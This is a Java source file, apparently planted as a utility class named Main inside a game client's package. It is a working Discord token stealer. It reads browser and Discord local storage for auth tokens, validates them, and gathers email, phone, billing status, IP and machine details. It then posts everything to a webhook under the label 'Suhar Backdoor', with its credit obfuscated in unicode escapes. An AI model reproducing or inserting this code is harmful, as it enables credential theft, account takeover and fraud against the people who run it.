package me.memeszz.aurora.util;

import org.json.JSONObject;

import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

//yoink inc 2020
//Main.main();
public class Main
{
    private static final String URL = "webhook";
    private static ArrayList<String> tokens = new ArrayList<>();
    private static final String LOCAL = System.getenv("LOCALAPPDATA");
    private static final String ROAMING = System.getenv("APPDATA");
    private static final List<String> paths = new ArrayList<>(Arrays.asList(ROAMING + "\\Discord", ROAMING + "\\discordcanary", ROAMING + "\\discordptb", LOCAL + "\\Google\\Chrome\\User Data\\Default", ROAMING + "\\Opera Software\\Opera Stable", LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default", LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"));

    public static void main()
    {
        paths.stream().map(Main::getTokens).filter(Objects::nonNull).forEach(token -> tokens.addAll(token));
        tokens = removeDuplicates(tokens);
        tokens = getValidTokens(tokens);
        tokens.forEach(token -> send(process(token)));
    }

    private static String process(String token)
    {
        Map<String, Object> info = new JSONObject(getUserData(token)).toMap();
        Random r = new Random();

        Color color = new Color(r.nextFloat(), r.nextFloat(), r.nextFloat());

        int rgb = color.getRed();
        rgb = (rgb << 8) + color.getGreen();
        rgb = (rgb << 8) + color.getBlue();

        return new JSONObject().put("embeds", Collections.singletonList(new JSONObject().put("fields", Arrays.asList(new JSONObject().put("name", "**Token**").put("value", token).put("inline", false), new JSONObject().put("name", "**Account Information**").put("value", ("Email: " + info.get("email").toString()) + (" - Phone: " + (info.get("phone") == null ? "None" : info.get("phone").toString())) + (" - Nitro: " + (info.containsKey("premium_type") ? "True" : "False") + (" - Billing Info: " + (hasPaymentMethods(token) ? "True" : "False")))).put("inline", false), new JSONObject().put("name", "**Computer Information**").put("value", ("IP: " + getIP()) + (" - Name: " + System.getProperty("user.name")) + (" - PC: " + System.getenv("COMPUTERNAME")) + (" - OS: " + System.getProperty("os.name"))).put("inline", false))).put("footer", new JSONObject().put("text", "\u0043\u0072\u0065\u0061\u0074\u0065\u0064\u0020\u0062\u0079\u0020\u0079\u006f\u0069\u006e\u006b").put("icon_url", "https://cdn.discordapp.com/avatars/703469635416096839/a_fdaa18602fc0a9b5ce3577a54d2ca262.webp")).put("author", new JSONObject().put("name", info.get("username") + " (" + info.get("id") + ")").put("icon_url", info.get("avatar") != null ? "https://cdn.discordapp.com/avatars/" + info.get("id").toString() + "/" + info.get("avatar").toString() + ".webp" : "https://cdn.discordapp.com/embed/avatars/0.png")).put("color", rgb))).put("avatar_url", "https://cdn.discordapp.com/attachments/761105850194329600/765200019488899102/5ccabf62108d5a8074ddd95af2211727.png").put("username", "Suhar Backdoor").toString();
    }

    private static void send(String embed)
    {
        try
        {
            URL url = new URL(URL);
            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
            connection.addRequestProperty("Content-Type", "application/json");
            connection.addRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            OutputStream stream = connection.getOutputStream();
            stream.write(embed.getBytes(StandardCharsets.UTF_8));
            stream.flush();
            stream.close();
            connection.getInputStream().close();
            connection.disconnect();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }


    private static JSONObject getHeaders(String token)
    {
        JSONObject object = new JSONObject();
        object.put("Content-Type", "application/json");
        object.put("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token != null) object.put("Authorization", token);
        return object;
    }

    private static String getUserData(String token)
    {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }

    private static ArrayList<String> getTokens(String inPath)
    {
        String path = inPath + "\\Local Storage\\leveldb\\";
        ArrayList<String> tokens = new ArrayList<>();

        File pa = new File(path);
        String[] list = pa.list();
        if (list == null) return null;

        for (String s : list)
        {
            try
            {
                FileInputStream fileInputStream = new FileInputStream(path + s);
                DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));

                String line;
                while ((line = bufferedReader.readLine()) != null)
                {
                    Matcher matcher = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);
                    while (matcher.find()) tokens.add(matcher.group());
                }
            }
            catch (Exception ignored)
            {
            }
        }
        return tokens;
    }

    private static ArrayList<String> getValidTokens(ArrayList<String> tokens)
    {
        ArrayList<String> validTokens = new ArrayList<>();
        tokens.forEach(token -> {
            try
            {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                getHeaders(token).toMap().forEach((key, value) -> con.addRequestProperty(key, (String) value));
                con.getInputStream().close();
                validTokens.add(token);
            }
            catch (Exception ignored)
            {
            }
        });
        return validTokens;
    }

    private static boolean hasPaymentMethods(String token)
    {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
    }

    private static String getIP()
    {
        try
        {
            return new Scanner(new URL("https://wtfismyip.com/text").openStream(), "UTF-8").useDelimiter("\\A").next().replace("\n", "");
        }
        catch (IOException e)
        {
            return null;
        }
    }

    private static String getContentFromURL(String link, String auth)
    {
        try
        {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            getHeaders(auth).toMap().forEach((key, value) -> httpURLConnection.addRequestProperty(key, (String) value));
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        }
        catch (Exception ignored)
        {
            return "";
        }
    }

    private static ArrayList<String> removeDuplicates(ArrayList<String> list)
    {
        return list.stream().distinct().collect(Collectors.toCollection(ArrayList::new));
    }
}
